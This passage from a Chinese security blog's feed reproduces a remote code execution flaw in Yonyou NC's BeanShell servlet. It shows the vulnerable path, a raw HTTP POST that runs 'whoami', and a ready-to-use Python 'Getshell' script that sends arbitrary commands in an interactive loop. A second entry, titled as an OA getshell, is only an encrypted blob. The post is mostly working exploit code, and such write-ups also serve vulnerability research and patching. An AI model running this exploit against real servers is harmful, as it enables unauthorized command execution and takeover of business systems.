      <link href="2021/06/05/%E7%94%A8%E5%8F%8BNC-rce/"/>
      <url>2021/06/05/%E7%94%A8%E5%8F%8BNC-rce/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="自行搭建测试环境"><a href="#自行搭建测试环境" class="headerlink" title="自行搭建测试环境"></a>自行搭建测试环境</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%94%A8%E5%8F%8B1.webp" alt="image"></p><h4 id="漏洞路径"><a href="#漏洞路径" class="headerlink" title="漏洞路径"></a>漏洞路径</h4><pre><code>/servlet/~ic/bsh.servlet.BshServlet</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%94%A8%E5%8F%8B2.webp" alt="image"></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%94%A8%E5%8F%8B3.webp" alt="image"></p><h4 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.1.88:8080&#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">bsh.script&#x3D;exec%28%22whoami%22%29%3B%0D%0A</span><br></pre></td></tr></table></figure><h4 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E7%94%A8%E5%8F%8B4.webp" alt="image"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Getshell</span>(<span class="params">urllist,cmd</span>):</span></span><br><span class="line">    url = urllist+<span class="string">&#x27;/servlet//~ic/bsh.servlet.BshServlet&#x27;</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;bsh.script&quot;</span>: <span class="string">&quot;exec(\&quot;%s\&quot;)&quot;</span> % cmd&#125;</span><br><span class="line">    nclist = requests.post(url,data=burp0_data,proxies=proxy,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;BeanShell&#x27;</span> <span class="keyword">in</span> nclist.text <span class="keyword">or</span> nclist.status_code == <span class="number">200</span>:</span><br><span class="line">        result = re.findall(<span class="string">r&#x27;&lt;pre&gt;((.|\s)*)&lt;/pre&gt;&#x27;</span>, nclist.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result) == <span class="number">0</span>:</span><br><span class="line">            ll = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">            print(<span class="string">&#x27;未读取到命令结果&#x27;</span>)</span><br><span class="line">            Getshell(urllist, ll)</span><br><span class="line">        result = result[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        index_start = result.index(<span class="string">&quot;&lt;/pre&gt;&quot;</span>)</span><br><span class="line">        result = result[<span class="number">0</span>: index_start]</span><br><span class="line">        print(result)</span><br><span class="line">        print(<span class="string">&#x27;输入下条命令活输入T退出&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">        cmdlist = <span class="built_in">input</span>(<span class="string">&quot;===&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmdlist == <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Getshell(urllist,cmdlist)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;未找到漏洞页面请手动访问 /servlet//~ic/bsh.servlet.BshServlet 进行确认&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&#x27;请输入url-格式为:https://xx.xx.xx.xx:    &#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    cmdsr = <span class="built_in">input</span>(<span class="string">&#x27;输入需要执行的命令：&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    Getshell(url,cmdsr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
            <tag> 用友 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某0A 全版本getshell</title>
      <link href="2021/05/20/%E6%9F%900A-%E5%85%A8%E7%89%88%E6%9C%ACgetshell/"/>
      <url>2021/05/20/%E6%9F%900A-%E5%85%A8%E7%89%88%E6%9C%ACgetshell/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抽根利群冷静下再想想！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="d8391dfc66a5729a09a669c26ace233c87f984ff5e28c780cf48ca8464ff26aa">d7b925fa94678c1a5cc57c3521e3ed94922228e9d3db8121a7760e1e10956183ba59f2aca78075e8a52f9b56f1f99688b003506cdba8f70467619880bde24f22ddd4d319d6714d77443e3859f16c091b02c66034ab299d2da6bf3cbc834e5bcfedd3224a43ffa33103a9041a60fbc228c6fa8f2680ddef8d3a72c36483d6434fa97238779c7180e99c5a84a0c4684a8145298c70722a742d7fae264cd5cdb9b4f3fcc2d08cecc7d38f39b67ba61128d634a2d680789bdd1fb388308a9044741d4b1964d6689b73490e33c6019fce3e34f8608eacf61e8cb244d33204e0f0a9996115b62bc724ac736fcf957560b64ec6f9d4c06f02b0807c033ea85ccc7a9ff7755d2591f14c75bb8cf16f7aaa6eb400028db4487841f2e8bf8eb616a3a9037456624ac7b9f31dc65690748cb2a0b26f62619a6e6c1f09fa4a07beead75a9612eeef546f4279a9540434cffacf51ddf1941db10ac7f8165c356b3abb9f79e3149f0da757ce900c91d9a57907c2fa3dd5c4eb826469fe433429d39aa6685b5ef6936dfd2003b0bef2d21365ae2fb29bf8d887c33c5d752e426227023d26b3e77492069777465d86ddf00943ccb879b2f850356c58d405fb065ab71ba974bf24192874e90c96a7ac219d7cb0f47ff255d873b568f065451c98c1e86f6048332df37479bdaa1d0c176c4cffca901b2b778a1b1b5f199a7d3a6badbf0df10dfcee80d4f6cf991db59a03fd9f77c5026866b68c518eb0664bd738fd795c44ca3489085a9af6a7b782214133be16379839941b9a7f80feb935cb02b0e21db58c156cbd498e7d278c994f5a78f5cb10c394309575fde8a5061bef30a0870e85646901b3836e428df517844a5d0fe9df35b449a1df9b93d9212277e46f9f5a75f348baf3a1e0016d2cb067f740b6e37d575377e16b2b115fa4c48b49dcb0cb0e8b536f739b8dc06c003c7ffc35cdd056ecb05319913d5a26582dc28955091051c3f2ab0608179f5aa58aa105d0ed3092272fe2fd8e92f3a0d938221656f910d35aac56f3d06d718d33f940db5312cde604efea37104cfbc73cc210bac6fea2f49b13d789e26e130b4636b5a30453827127f363d4ae3e55f9bc0b11aba0a3c45b6f70499b109098d8eb1f3cf6d687088e544fe093fa23122dbfa23d0382a3e76ce2513810c1713fde82d0c81013616b03ba75e01718df89523a9e6df1f77ab35eba94bbbe94f459979109a10c55d8afb9ac17d6dc06ebe70ba4a5d29755da9af47c5d4a821bb72608cbce7a5078522855bca57c4070685d312af5c348ca2fbf8ae7e4b612c1a2784865b42376f8a39cdf4354301e50e9bc01fe3d357a88f7f3ce0615457982831c2a29de5780cbcbb32aed3ae0aaf6566a470471f04cbad57138d97218613b7cad10455397b34026314349f7dc43c2daf8bc7683c1992cfcf4da7d7ed5d2d7e3f750e663a5776c1a663c14d5ca4e80b18377a13b8a969569b1a4a137ff0aeccb472bb1656c3b2fbfc81797932c40158a38c2bd7afbbc2fd65ffaec8f4f5b6f8bc99f40612ef7fc535c0008edc43b30bbc7d259d040011a11d7defc1de24eb4f01e5acd453f717ab4169da7eada2aa578b0a60f86d76142e3ccb4d6fc3b6fa65fb033c34ea8a4321396a608269872c520b81f433e5ae5e136d5cdd8d277e43f7bd7de7ef985b21ac1bb10bee35fade8e53418c63bff94e39f06a86480b4a6b62c9b64de5ad2ec42d33cc61aaf0006eee3b7b649ce0a3f10bb2933b0f2948deed92716f710feadbff613a6e88d3ad9a35d1d7c56d72880c2ca1007e7fcdc97fc4f3f74181606ee31bf1a99e408010785b688835b1a20f687eafc4cc2ac398231dec85fad60d5bea362fddea7ed34ebfdadc324614e5782279b406dd35159c9a57f1fae2bb982d7e5ebf27aaf7dec7a971756a332608c2481a75a368b18d049c4ffe8828350d73efb50ca040576364f5eb8575e58baf8b36a1ff202551a8edcf9f8cbf3e3a0c3f98c79549e50be2d03431a181f080aec165695d9e89c886d61cb89d4d1483fb1370c1fe11b2e6053ca9ec1f625270f6202d4e8965bb9b9760ca0b468b670082cb3b6f759a3c94aa08efc4481b0d6a97f37814965f6643b42b503ca280e6d32af9940ce26f738cd82e4392fa5a1d7e8c3cafea7f5fd58718ecc5a502762c71ecdf1a80b3df57a05da27f5a315c17836a0c3dd54cd18ceb0319d4f70d85a962218cee98262e82e907e870ce7a4882607112edc2b63fa2f9a22cde7eaf15d076aa0425a8ba48eee548c19424911a371729adec8e446971eff72e4713a70bbbfe90a9297e6d72b1e6e334b7f90e0bd519f37967ee5d7c175cab9bb6a4c91510e89c27aabbfb71122ce0b2a6e1bc689bf31294a264ae2f8a3acb00013b438f58868c6135d30d949c9af96ea87c5ea0ccc4dd94bb7d5bdc042275e9043254deb64b272154fde146be32775a92ad0fb0d65c50ca0be71278c89594a9f0eaedc664f25e5abda15830b9f3a1052ed19e59ecbe1488f02c9f4c6551a6b8b322d0012a682e79441f1db475f6b2873932c73f75401e45d0166c86d3ddfbbd87b4ef11305cfb2ee4269be8c487d21240ee7b8f113e4660a78173e30a262b419c9e3fb56e61ad6e40734b41d693028a5a5f24b0756c4997e47cbc5feaa4c745586a9350d25ada4e500a396927101545141ba6c5708afcede1275c0025c659a81a16c47180a342ea60c19cfde3e17e69a407df9b2d298d9d767103811307a55d4c1d13a15e6a6c3f7a131c7a93c6f63f488da66995dd5a882690331554d6ccfa6654c7048fa6cb2c5b9827f7ffd0f9e649eb3e131e1eca7ddccf72de76addc1b14ff083f0c5bb865a505a35bd2c0aacb18059380668639574f187e546c2c62487c7e79392fa70b807027865213ee6b9be65616bbec395b0de553cac700b8f78adb262d2487a326e08fc6e84c858082bc402e21e58aacb893bb43d784b71df9df5eb89e173397be5a01910f17169955c2ae83a1190b92cfbeb1bfe3d42fbd85eb63543ea751f7f69cd45b501e4ecf32e5178d61bbf46baafbb9407ec1e05a2e200fce33d69f4ebdb071e140db1adee6005819aafbdc4691d6598758e4ae0346c215c038315d3d07e03173fb105c90755bae748455092a5271d2fd57cc8c7b94398398ee02c484a5236e2f9afcc8580739f1c54c15fa7cd13e41cb727bf18d9da6fbb66c853890e7cd72a81f4b89515bf5f146b4fa2bac46645e3873cb0cf2d66354e5ed2858c079b627f158ab1ba9a7867a6755a35f4a70460782972f5ec2abdb7bdaea80d0f40415f00c018b9677d7e4cdd0f49a74014003758c29213bd27fd769cc8be5f4fa965c807ede58b917a8aa42a34f8f4d84195336a309bcfbe43eec82e3f21f45c5b9c5bf41cfbbc09438c50077e39e3585c0928e3d7feec84f537d3f6777b94f2d76973fa37d3b7706184bb903a27382ebde7079faf29a4b1518f09e051a6469d6616e2da8eb7f1e0db05a5f3f64d872adf14e72b9b82de61a96338d94adc11fee59a785431ec147418418928e1285f8ceca8cae71437d1240e70ce65be54722f36214d42169bb1d7b13d0b0837b06afa31bdf5214c87fc38e30f304cfd9ec16f5bbb2cafeac0b71f8797313d794f96a562977a4f1cff396d6f75132d472ae1f433206fb6addad70c77312074c122a5890cade7f240ccc5dc4a9d764f8f66430c17b2bac4132d4721c324946ab5690c6e0ecedd329c276c83552779ebc992a3ed40cbadf554fd0a766fbed5f15ed951d4bf376a8688c4fd8884aa1f0cc00136f2da21377d1533348b019fc615a00a7ee512a4bb731739f061e35b19ade4cac046445f9e4d76f88d0053e9c93edd19cdff7381371645b01c4eb151bc56b440bac243ca025642da6f29292550aba97a5de9ad1e7c0de02c1c0715b2e61c8950bfa9404e01d05b863c2c91cfd261b212a3ca143e002393999a884cdb5f6d01ffe5140443420ccf505c76dd32f6d51b7032785ec5d865085965ccafd97fb8c54f73505242ed4a797738e525a8d17b1d2a71fb0032a01542a802fe73105ba965b36975ebd7b936dca6298638147cce51e2bc7d1131e016fd41b4cb5d321d940512e4ff2155834a766cfba232e09e184fd308483fe2a57a24f1f50d39f1663d4bd873f3c493a4e6019b8e69175c2ab0f912845653bd9f6d0c4959303288600f15855d1b3395e4a9b6767fbed799a714fdd6ee2e1508020b0a79cad14f909c90bc8404731351668bac8204be9cf0764dc50626090be882f17f63e1e7bd99a01a0725297ec50c5b70c081a485e60bc10a7556ae7b5d0fc6fdf197931804631768cc63dd59230ed7514505ed62478cd25e0979b7f290b15b15d099298360432f58420f43d962cfb7368a46610f9a43265630f15dae36fa9830c4a5bd8b6ea84e5ff77473f9069ef7c716207065c0f9af7947bca9ec6f28043011552da1952e1d625ced8d8508902adb05f89b591a63a2dea039c1d30ec52674b1037ec0d81b2fe26fc75dd2b3afe3533122b8281efa86760f2835d3909ffb86772ad3e092dd539a72440b87ef53e646df1ae8acb5437e387110a3f6600ae88a61e9227faeb1e82d933580d8a48df2c151baa70cc590b32fff87ea5cd7911e93c4f062633fd993d9e10319a97a7d80835d613357eaec8eef354a54c37e4ea0881c86fdf3dc1b3b63873c59ff8e7f028776515c586e3ff3ac858b50a7aa3a1506701fcbdcca31a7fa77f37cfb50d8b15bab02eb98c5b5aeaf13b0b7a6bd8486413cb7709bbabb4b05d28a2ceaf695c53d5c2d01f7bb5b3bba1c3c747b70c5e63e2363a52a889bf1d250f3128ac44be68b280e852426505eec80086a92b502f82af67261238754b5d677403572203a36f39cf93597c3b5613b225d1453fa1ad7cec97ac8a6c14d4bf9b4f3794df7630f50a6ff88921a15dd29765421166513b2cfa2f8db4303e200b18fdb898b558d96bb35f993466f53d452fe7043872974b251f7f733adc01dae3fd25b3f6e4b39ef33edd445e97fcebbda86120ed2fc1f2612f916e4b627be145d0144c828deb5ae03e8cca326e88368c57c7fb14455de73910d08ef121acef947d41b704fdb281e08d9300ae0a9506ba65bba46ba0df77812e69f540a7a16625f4821f365f2ba45bbaa6dbaaea05b3d08c01e4c28c0d59ad282b6c8854668651bfa5c711eba1fc9fce35dd43709c5f970e939e8db74beda0c4b32927bc42721e4bf7f53d4231f3efa9db165754234ec16bd6e7ba770a66dc1f539a49c7584ba9bf5073089998fa3b128e3070876f29e8c7326e2b7c4efb4b7ca5c2f4313b5890319e435057e1f125238c92f82141b7b66bbe2dfc377656732f84ac8e0714ecbea39b1ca50bc31b2004267cafbc66e59245ec2c461d63882846e1d0021b1bd2b24e9911e7abd118976f47c3eb1151338165a9fd859ab675fcf0f17296de54be89c6d2d42f1e95f06b10105d531428899c2dfc34a085aad25a75c445697241cfe01b192577df8d2a6d857a6fa37dcb12cb4504718fec534959743b968cd6129ac4ee15f35174fdc209bcff54b1ef56193c34115222e78be06472c1c65c00ca0393c105a2b263c1cf34deba4b836e4d790cdce8d4e818d4ddd6d846d1da66a4b3155eaac9e658ac16b642569f8098b7fd22a62f96988cd6df8dd61400255f8ec2f9cd30d6851c6dcec510bfa3b4802ab7a5fb7f947492b5bb81640f17d3c852229adff10436b9452cc54d38e83105732d19c3282831049913d9bb7e0f0da804cc8747fd4bf97a132699019bb1799d35bdf2cfd9305ec8b82a5be5ed68759b7c5600e00c9f21bef9c1c0d84512cc68d107d305fff16b20c403b198771716720e59ce499ad3b1d8756a482857af9e817b287ab43b1ec77b540a056d47a14738b16879b0093ae1fcce5cdd5daef1472629904466d44b11feb09111e0803b447a3631c929dd1623cdf1f5945c93b05d4a69ff2d6276dffafb86d9be86947777eb13d360433c6ecd1806280678f34766d52cee76b82f92ee1ae74487425706feb1c7726b93f98b2dc1dd8596f668164cff81d8e8f868cd5eb06663fa07de13d272fb32249c86ef84a537d4b6aed78129e3f19251dce12ff817e9e0d703fa507be11356e4119ee3925cbbe7430b056f4454cd34c57a6267f83184379a5bd942dc48c33e99b0ec44fd8b84de779459ffa80fd3747cee1059ae3413d3a69d11923cb04d2694d105d83760f3b870dd97f5fd9cc973df8172d1b7d774b188674b68d7567421b4a2a58e3ddd2e5d916baad4ae33b32d9e45fba9cb19e7e3b77a8ad1184968536b9f02204bc08a90b7f94111d1158d778b6821cd6b70890879fe28cc4488cf35cc94b5d498b3fab2e95fee899c7796196b9cafdfcf5afc0673c86622fe33e30bfeda45db8364e6f26746e3388edb20956eb2e5882ef09d6a192399171d586c539d2c82ee0884b00ea883fbd816a6b5420135d3522d854bbefad251177d52ee9b20cf2f03a2017e4ad7ccbbc1243febad4ea7ce78ce228bea763a934e827a2014beff649608107bcd7bd9f4bff4eb1ec7855d2584e63e9fdfa3665f213a75b3e4d7b94819b84fd0817b2147b219e6bce247d1cbda2672a38aac3eb475147a267cfc0cbd0083028a64978fd33d1eeec67576220513118d566f7462369fdb552139c7839733f5aacbec84be0c54c05607244feb9f42ebf4da7f52051ba25fbd5fa1731d2d0e68cdff66897b975fdcc7c8cd9c280716cd3a725218222c04bb8e0881839a8ab1dd10dfb2b7b5437ac443f52ecac0cfb24e08279da0ef37a2f06b204d07e6632d6ab3f8a2733f814716e4b85db1b01d38549e2359f3d146936d36703ffb2f5542cd6b44c29f239ca6aed27e62914d263c08004472d3968051b7288d204cf6367c490cdb6adac5527847126442a12dd1706f09d08f0fe1bde3bcd26ec3eec2326614f581788159ced6f69ddc1455077c60500762acfb456bc104a7cd136c5e2b1b72624878a5e69548c428d79f867faa5269077eaf790aaca5ea842ab9599ac09c54166f552eeb956dd450b8ee23192fbcddced3102c2daf19a8ea961c17e261d3553d4b43280ebdf36e900880e915ccc12527f0d4cdcfe0d30f90faea5ef0c5df12e858585b14ba046ae0c425bfdc23ae61548debdee38a75816e44ee579998d34156579fd3d49822c05389af9c51e0b38dc3d95eb40f97ee6359779c62023e107e84339838ee1bb2453ce0c31fcf8a6fb9b4710809950ee62f4e6de51df4802daa8fc51306bdebc9f76c6c0ba1cf6a631953ba1904272e2da2e61539a06fcc1fbcf054b1c05664cc94119f44d409453da181e64273f577d16d7e663143d2d115fbe85207f4b643ebeeee55844fee6c8c85f6c17d6beabe6b1fff93853e29d786ce797912e57eb1437f6c00235c9cc860dbe674191bd97383a26f7c1cba822a9b6634c6ffee4d1c66bd25e0d2c915cbe07581ca854682724ddc3ca0e598a0456f69ceb791bcb12398df346ad43b190d1b3b8c85b4ad5131da017927230f5fcf8c62658616ae155f55253e1e2be847e9748adf29cea1c6466258f26ca511eaa261ed31844a6b94346d886327bbed2f23c4d6257cee909e4933c558da56b05a2c51654baf6c7ee69742b65444f2328bb7f4e19dd35b2bf508e159450e97ff77d3f6dd5b20acaa36ece2cbf3e2c847678fc27fff4de81e01cec93e56f5bec8c3e86bc4ece3dc5867fec22cfa8436126d2e0094402beb0f225526359ff2875de7081fd97162ebc6d4f403b48142c860da4d51a55e7a73c4b9334faa2cf418829565d19f784fc49751d03d93f5d93a5ab9e69102d9d790518cd5d4c54c67b52167dd4caae5fb9f65898a171fc5a60219beeaf4131b96c7d335d68c065a8d058b5e9c15597db32a7e0b56a50e8f593a7daf9111cf78b53db580b69c874c2f30d71be6586ffd4bf3ef6456ee6c961e350669eae2566af02464d04033a189cc92e4fc8801df652d34c3955f212f4278c87c9d3bc64beef0df2b206882b59ef41dea6f0a537da091d9289f5699cd5f120a820c5e8751e225a8bfd773c788d232c1d9b1f0fdfec3f4d9397239fec17cd3792f127ccd2341fab33ed435df771cdb16eabd40c06772c33fd76488ab6f9a2f0eb4716e326077204f14b4ef26a275efadba499b87e820812e75d64d27b3da753eb75f14aed36db9d5c8b16b6a62152ffeca57154d9570724f8e92eeef7de944205877d6154fab8a93aaa2737d0405d62d5333fb28dfa99033a2161991c3b735de3729e4be08b73be1bb660d0e460454cd83ab800b1b1a04923088162d195ff49950b4fe5bbe37c52bbb78fb9ec589a8aba5f1879928bd132572f03f21c00e47eb448949390ae7395441b8fecca2061f333726adae770734ea01f7c6f7494e79ed42873e00bdaf48dad25410151e470454abd0662f7e14f664c4a26d4e19fb1bfc3af35498562480ae82312390c8ab8ab3a01d4b9003b1712ecd62606b1c6607a13ab7b4448a4f5c148cf3f8104c19b5eac641628149918d9ccb5ef4a485b6903ff7cf942b6af547d6bfc0f90057e251ba4c3bc041d6d26717874a69a4a30dc0faebd9c3219cc5c11f81c69115b088ddc4e5f6d80ea7a6f35bc804c2f25f16004a0ec61f7ad780d1eafe0ed659ab29ff042b60342acce3fe35f4567a23f0e3c895f0a6628ff2d7c789a9f84e9e6b4299dfdb2863abb6617ed0d5fc58850ab04c8f3ea170c6647817c0fd947bec57bdb73225f0096a82c4dd5f7a6648f8db11621722dcc524b3643281d41dd787e6b54f3781f9ea0e4ff0daa15f1459f6261c658bc0db6dfdfbc8f091db3d8d0fbc3310a701e9dcb74937ac49719dcae3b876d1eac10eece7cdfd86d8768e8f45cfa2cbc7224476169f25e2596f1577305e51c6dee5a3d39b7e6c2301ddc8548c1041487add88bc9859d7ff54c8b4296b9a7e4480adfcb91c74dabe0a18f7c1dcb561d5b5131a741ada328d01d46c4e2d2ebd789ccdc0bd460ec57336e18e1147064e1dbc3b19f59cf72e82cdde77b61c81db48cda4858382d58023885deb8571279b94e1625e532e07999e54ff51d774973ee35c7e3aa1b222da7d0ee6a9ce11e1dffe1bf6015029b465a5225f42169b0a81d3c41e9f1150e1ad0debba1a75f64e7df8c5af87e05b54d1f0771c52c8d7c2347a27bb8ac1e6b1c32624d4fb5fec438ec08636b2d9e35a8efab5fd632cdafd5356e179802a95befc7dddf7f015769b0d6cc489461da4e1e88ab3b500a3f600154898974187754eafd311b84e6a85c6390eb6b3073032ded575fb40fbe71848a7218e4208ae73aa91b6d0f5f8214f74bb768093a9c69bdcccdcbb3ae88ae6acd1a1fe7fa91d2c9e6ee2e0421c2af27b1cec73efb7d48595029a8f9a5422616465d1795104f8648dfedcd014aa1ed049cfb87b939061c935b8ce8f0e3945a5db62117b542df53de22d9d8520fc89b10189adc4929e319040dc901af5cdb0ec6e394cbdbdbb1acc061cb6a7455da1f75816b8efa79a07a09cf7cf7e14ee8fadc26ce7e4eeb375e1acac3abed9b4450a2c56e6c3a2c653cb4d6ae8f7754353a1d194912ab1e6399e24f681d9a69f8ebbb1f995a7d6efd3faf007d978e58c4a8fd85663d175de77e908d58b11e8c67bb370826f07fa5b8df4d0ac4fe7b15362d5137713d38479a6bb93b338f71514238b94e426bcb2db722dde5b6696cef6b0e0eb30454c45d6c47c462dc9aa78d350f153368f620be74fed91b2891a75ccba448f1b33a9636ba00e0d160c575fe13252bf66e6eb9d64d3b4274ea9dc18b8db24ebd570534bdaebeb999d099e16bc582dc53008cada5d424cb345ab2df2a25f64ff2e3b248e98ecda514751573ef9d70ae1e29f7cf9ef66c20f29e5e8a7f8fd4d7303313c65bbb321a344aef89f2bbfada28ed8d75ee7d39e5249c9af4538d390c7ff58b80ec7976c246cdb468f47ed272c232f06631cce1c69989fb30d1a75a886712664fed02016e3b3fce55971b7db36b9433e1d7f14ce349646a88ff9630c87eb9c2e1c0dc7c2e1e0a68d3c29206257408f6262ffadcbf4b84c7b0a23d2ff012c41ed820d9b0df51c48e5db94c212560dc62dfa3306be461a01d99bedcd38b57771ac09024cb679de95542e958a68c00ff8e2bc904af41c93e277a69a61066640c07755165af3d610fe37062ea77402d8d4f9f67350af7dccb1ed98f5edb76e1b97cf8870eda77e726c05faa84aba1e1273dac84818a21377c046bd86a9244c0787d6a2de69cb65fcaab674f6042260af70c540e4dd51bc6f278ca1896919cb6e8a7c7d3fa2d00fa9413fff4fa09a06897844b8def834d1ba4bc2604abb10be7266bee59a9e2365cf6186893da0ac6f1978e48a58017ec4035ec81240f44356addd7ea09798ba01f758692a6e79df0937227b6d037c6d1a99f7e80669d9edc8d291dcd5226668dc43c749dfd1b431c7d4130e301a24e43bdccf8b49a93e43aa6f505bcf889cd0143def7238326925430701fda535527f833b06f14dcb50bb2780ac3930f6c9c4aa800f0d962773c91202e23c2a786be99e71a5a423a29e0dcff5bc3522d4cbc324ae7f78c25655edd441ffec1924e9960df3b0854b76851b3b3172fd5ba3338e302c3b2dfdc691e743edf810c1b3d429d776599bbc8d6331cf98e3cefc5208beb2eede7e667ba30440742a98e39eb88a424cfcee2ca139dd6a3fe2ccd595babada228f0605873f7aec85a2fe56b670b1b4a5c0443453bed8af07c5eaec38cee84db71e1b147500916e7ad3711ec208535ed4d1c3cdcc86e718ac4093974dccad426437b49216f4f92017e0b877606e7ecf4f5b161dc8fe59e411b5b9adb61881f335aa9d4d412e28e69e4c8de301bf5b3854b3e88deba052eae5af7575074a4776cd38a5c0968d719a691ff135e2d13a9f70c38252119c326de4f6b33fb92fe38109360c687ace677f41e74a46ec6a266ef141a91e27b31ed69115fbbf29412643c76c02b22eb89450ba06b7c47f056ca07ac2f6abfb905ce974302b47cdb42b41e650dd3bbc73778ea637ec45046dc1f03b47967d3419caa5f0785802638b30815fd8af636cb28164181f185b93ca301dd5485c98e36447fc86a1ca5f041a3475efc59b22b3e3446ba70a85e27000f680e13cbc9c91a3673da0123e21327a2821ef3cd4330f4eaeabc6a610560b7ed112930dc28a3587bb5a280f26aeb1f288e1dc87b04c5f3a7927a6317db1b8b1aa2cba4d092a78d73e942c37e3f92c6027503d9d7922a8b5ff3e7aa2d912e7f12ed07315a12031960e879eec14901ded05c8bdb4798c0f1c6d66430ebc91b137b9ba7b62d8729fe65d7e1fafdc5b8c32c6ec91d48d30cdd602fb40eef127b5a9defaad0a7a22dd5ba68c74a4efeace805dbb2cc3bc84256607cab47bb278cbb8bccc796538578802de0015c88a876834d2fba8ccbf03ec358c514759c5ff5262ee46261cb1208f81a668d9d4d29afa5788d1893fde3221bbdb93e52897a3b5e7b84e6515db682a90a9309b95c92dfa817228fff98cfbe0605567449b57007de35cbb181f5610e918d7109c00b574041be423e894c40cde1b812c8e8bb2e7c4d0f5d5525b24a4b811eb3b66cd13509050d8e328859773b76a3dc79db4cef48c137e976234a27ff2b5870604c5270aac9e177b540c58cff7277789eb8011bc1e5185af63ead26347e4cacf4ddea2b5ad242aa4551f98eb0c502aa98b976e26f0125a336d7c70abc2bb628c97954a8a7c9eba6f3da2af6c06753b89782110fffe433ac725075c80dc